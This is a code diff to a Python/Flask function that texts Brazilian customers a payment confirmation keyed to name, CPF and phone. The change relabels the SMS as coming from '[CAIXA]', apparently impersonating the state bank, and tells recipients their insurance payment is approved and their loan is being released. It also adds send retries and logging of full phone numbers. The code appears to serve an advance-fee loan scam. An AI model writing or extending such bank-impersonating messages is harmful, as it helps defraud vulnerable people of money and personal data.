@@ -347,20 +347,45 @@ def send_payment_confirmation_sms(phone_number: str, nome: str, cpf: str, thank_
             app.logger.error(f"[PROD] Formato inválido de número de telefone: {phone_number}")
             return False
             
+        # Formata CPF para exibição (XXX.XXX.XXX-XX)
+        cpf_formatado = format_cpf(cpf) if cpf else ""
+        
         # Criar mensagem personalizada com link para thank_you_url
         nome_formatado = nome.split()[0] if nome else "Cliente"  # Usar apenas o primeiro nome
         
-        # Mensagem padrão com nome e link para a página de obrigado
-        message = f"[PROGRAMA CRÉDITO DO TRABALHADOR] Olá {nome_formatado}, seu pagamento foi confirmado! Acesse para mais detalhes: {thank_you_url}"
+        # Mensagem mais informativa para o cliente
+        message = f"[CAIXA] Olá {nome_formatado}, seu pagamento do seguro foi aprovado! Seu empréstimo já está em processamento para liberação. Acesse sua página de status personalizada: {thank_you_url}"
         
-        # Escolher qual API usar com base em SMS_API_CHOICE
-        if SMS_API_CHOICE.upper() == 'OWEN':
-            return send_sms_owen(phone_number, message)
-        else:  # Default to SMSDEV
-            return send_sms_smsdev(phone_number, message)
+        # Log detalhado para debugging
+        app.logger.info(f"[PROD] Enviando SMS para {phone_number} com mensagem: '{message}'")
+        
+        # Fazer várias tentativas de envio para maior garantia
+        max_attempts = 3
+        attempt = 0
+        success = False
+        
+        while attempt < max_attempts and not success:
+            attempt += 1
+            try:
+                # Escolher qual API usar com base em SMS_API_CHOICE
+                if SMS_API_CHOICE.upper() == 'OWEN':
+                    success = send_sms_owen(phone_number, message)
+                else:  # Default to SMSDEV
+                    success = send_sms_smsdev(phone_number, message)
+                
+                if success:
+                    app.logger.info(f"[PROD] SMS enviado com sucesso na tentativa {attempt}")
+                    break
+                else:
+                    app.logger.warning(f"[PROD] Falha ao enviar SMS na tentativa {attempt}/{max_attempts}")
+                    time.sleep(0.5)  # Pequeno intervalo entre tentativas
+            except Exception as e:
+                app.logger.error(f"[PROD] Erro na tentativa {attempt}: {str(e)}")
+        
+        return success
 
     except Exception as e:
-        app.logger.error(f"Error in send_sms: {str(e)}")
+        app.logger.error(f"[PROD] Erro no envio de SMS de confirmação: {str(e)}")
         return False
 
 def generate_random_email(name: str) -> str:
